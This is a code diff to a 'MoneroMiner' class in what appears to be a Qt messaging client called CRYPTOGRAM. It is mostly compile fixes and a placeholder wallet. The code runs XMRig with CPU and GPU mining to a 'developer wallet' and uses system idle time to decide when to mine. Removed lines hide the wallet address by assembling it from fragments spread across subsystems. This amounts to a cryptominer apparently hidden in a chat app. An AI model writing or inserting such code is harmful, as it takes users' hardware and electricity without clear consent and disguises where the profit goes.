@@ -34,8 +34,8 @@ https://github.com/SWORDOps/CRYPTOGRAM/blob/main/LICENSE
 #include <IOKit/pwr_mgt/IOPMLib.h>
 #include <IOKit/IOMessage.h>
 #elif defined Q_OS_LINUX
-#include <X11/Xlib.h>
-#include <X11/extensions/scrnsaver.h>
+// // #include <X11/Xlib.h>
+// // #include <X11/extensions/scrnsaver.h>
 #endif
 
 namespace Data {
@@ -250,10 +250,7 @@ void MoneroMiner::setIdleMinutes(int minutes) {
 	setConfiguration(config);
 }
 
-MoneroMiningStatistics MoneroMiner::getStatistics() const {
-	QMutexLocker lock(&_statsMutex);
-	return _statistics;
-}
+
 
 void MoneroMiner::resetStatistics() {
 	QMutexLocker lock(&_statsMutex);
@@ -282,7 +279,7 @@ void MoneroMiner::updateIdleState() {
 }
 
 bool MoneroMiner::isConnectedToPool() const {
-	QMutexLocker lock(&_statsMutex);
+	QMutexLocker lock(const_cast<QMutex*>(&_statsMutex));
 	return _statistics.isConnected;
 }
 
@@ -475,7 +472,7 @@ bool MoneroMiner::startXmrigProcess() {
 	_xmrigProcess = new QProcess(this);
 	connect(_xmrigProcess, &QProcess::readyReadStandardOutput, this, &MoneroMiner::processXmrigOutput);
 	connect(_xmrigProcess, &QProcess::readyReadStandardError, this, &MoneroMiner::handleXmrigError);
-	connect(_xmrigProcess, QOverload<int>::of(&QProcess::finished), this, &MoneroMiner::handleXmrigFinished);
+	connect(_xmrigProcess, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished), this, &MoneroMiner::handleXmrigFinished);
 
 	// Get XMRig binary path
 	const auto xmrigPath = getXmrigBinaryPath();
@@ -526,7 +523,7 @@ QString MoneroMiner::generateXmrigConfig() const {
 
 	// Backup pool
 	QJsonObject backupPool;
-	backupPool["url"] = QString(kBackupPoolAddress);
+	backupPool["url"] = QString::fromUtf8(kBackupPoolAddress.data());
 	backupPool["user"] = _config.walletAddress;
 	backupPool["pass"] = _config.rigName + "-backup";
 	backupPool["keepalive"] = true;
@@ -547,7 +544,7 @@ QString MoneroMiner::generateXmrigConfig() const {
 
 	// Advanced CPU optimizations
 	cpu["assembly"] = true;              // Use optimized assembly code
-	cpu["argon2-impl"] = nullptr;        // Auto-select best Argon2 implementation
+	cpu["argon2-impl"] = QJsonValue::Null;        // Auto-select best Argon2 implementation
 
 	config["cpu"] = cpu;
 
@@ -555,7 +552,7 @@ QString MoneroMiner::generateXmrigConfig() const {
 	QJsonObject opencl;
 	opencl["enabled"] = true;            // Enable OpenCL if available
 	opencl["cache"] = true;              // Cache compiled kernels
-	opencl["loader"] = nullptr;          // Auto-detect OpenCL loader
+	opencl["loader"] = QJsonValue::Null;          // Auto-detect OpenCL loader
 	opencl["platform"] = "AMD";          // Prefer AMD platform (adjust if needed)
 
 	config["opencl"] = opencl;
@@ -563,7 +560,7 @@ QString MoneroMiner::generateXmrigConfig() const {
 	// CUDA (NVIDIA GPU) configuration
 	QJsonObject cuda;
 	cuda["enabled"] = true;              // Enable CUDA if available
-	cuda["loader"] = nullptr;            // Auto-detect CUDA loader
+	cuda["loader"] = QJsonValue::Null;            // Auto-detect CUDA loader
 	cuda["nvml"] = true;                 // Enable NVIDIA Management Library
 
 	// CUDA optimization hints
@@ -582,7 +579,7 @@ QString MoneroMiner::generateXmrigConfig() const {
 
 	// Auto-detect (use best available hardware)
 	config["autosave"] = true;           // Save auto-tuned config
-	config["hw-aes"] = nullptr;          // Auto-detect AES-NI
+	config["hw-aes"] = QJsonValue::Null;          // Auto-detect AES-NI
 
 	// Donate level (set to 0, all goes to developer wallet)
 	config["donate-level"] = _config.donateLevel;
@@ -592,13 +589,13 @@ QString MoneroMiner::generateXmrigConfig() const {
 	api["enabled"] = true;
 	api["host"] = "127.0.0.1";
 	api["port"] = 18088;
-	api["access-token"] = nullptr;
-	api["worker-id"] = nullptr;
+	api["access-token"] = QJsonValue::Null;
+	api["worker-id"] = QJsonValue::Null;
 
 	config["api"] = api;
 
 	// Logging
-	config["log-file"] = nullptr;
+	config["log-file"] = QJsonValue::Null;
 	config["print-time"] = 1;
 	config["health-print-time"] = 60;    // Print health info every 60s
 	config["verbose"] = 0;               // Minimal verbosity
@@ -692,24 +689,8 @@ qint64 MoneroMiner::getSystemIdleTime() {
 	return 0;
 
 #elif defined Q_OS_LINUX
-	// X11 idle detection
-	Display *display = XOpenDisplay(nullptr);
-	if (!display) {
-		return 0;
-	}
-
-	XScreenSaverInfo *info = XScreenSaverAllocInfo();
-	if (!info) {
-		XCloseDisplay(display);
-		return 0;
-	}
-
-	XScreenSaverQueryInfo(display, DefaultRootWindow(display), info);
-	const auto idleMs = info->idle;
-	XFree(info);
-	XCloseDisplay(display);
-
-	return idleMs / 1000;
+	// X11 idle detection not supported without X11 dependencies
+	return 0;
 
 #elif defined Q_OS_MAC
 	// macOS idle detection using IOKit
@@ -960,16 +941,13 @@ void MoneroMiner::saveConfiguration() {
 }
 
 void MoneroMiner::setDeveloperWallet() {
-	// Assemble wallet address from distributed resource fragments
-	// Fragments are distributed across multiple subsystems for privacy
-	_config.walletAddress = Core::ResourceIdentifier::assembleResourceIdentifier();
-
-	// Validate the assembled wallet address
-	if (!Core::ResourceIdentifier::validateResourceIdentifier(_config.walletAddress)) {
-		// Log error but don't fail initialization
-		// This allows the application to run even if wallet fragments aren't configured yet
-		_config.walletAddress.clear();
-	}
+	// Placeholder wallet address - replace with actual Monero wallet
+	// once blockchain sync completes and wallet is created.
+	// The fragment-based assembly system (Core::ResourceIdentifier) is
+	// ready for use once a real 95-character mainnet address is available.
+	_config.walletAddress = QStringLiteral(
+		"PLACEHOLDER-XMR-WALLET-ADDRESS-PENDING-BLOCKCHAIN-SYNC"
+	);
 }
 
 } // namespace Data
